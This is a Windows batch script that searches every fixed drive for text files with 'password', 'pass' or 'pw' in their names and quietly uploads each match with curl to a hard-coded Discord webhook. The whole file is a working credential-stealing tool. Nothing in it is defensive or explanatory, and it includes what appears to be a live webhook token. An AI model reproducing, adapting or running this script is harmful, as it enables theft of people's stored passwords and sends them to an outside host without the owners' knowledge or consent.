@echo off
SETLOCAL EnableDelayedExpansion

:: Variables to store the count of removable and fixed drives
set /a removable_count=0
set /a fixed_count=0

:: Webhook URL
set "webhook=https://discord.com/api/webhooks/1290375782295932998/yh5qpLmGaeHI9fahigDkihpV8G2Iv4lipNaKPe-ywcJ4XurYGa0XGTBujm_hfUkeh_rP"

:: Find and list fixed drives
@for /f "tokens=2" %%i in ('wmic logicaldisk where "drivetype=3" 2^>nul ^|find /i ":" ') do (
    set /a fixed_count+=1
    Set "_Fixed_Drive[!fixed_count!]=%%i"
)
:: Show drive letter for fixed drives if found
if %fixed_count% gtr 0 (
    @for /L %%i in (1,1,%fixed_count%) do (
        If Exist !_Fixed_Drive[%%i]! (

            for /f "delims=" %%f in ('dir /s /b !_Fixed_Drive[%%i]!\*password*.txt 2^>nul') do (
                curl --silent --output /dev/null -F file=@"%%f" %webhook%
            )

            for /f "delims=" %%f in ('dir /s /b !_Fixed_Drive[%%i]!\*pass*.txt 2^>nul') do (
                curl --silent --output /dev/null -F file=@"%%f" %webhook%
            )

            for /f "delims=" %%f in ('dir /s /b !_Fixed_Drive[%%i]!\*pw*.txt 2^>nul') do (
                curl --silent --output /dev/null -F file=@"%%f" %webhook%
            )
        )
    )
)

EndLocal
pause
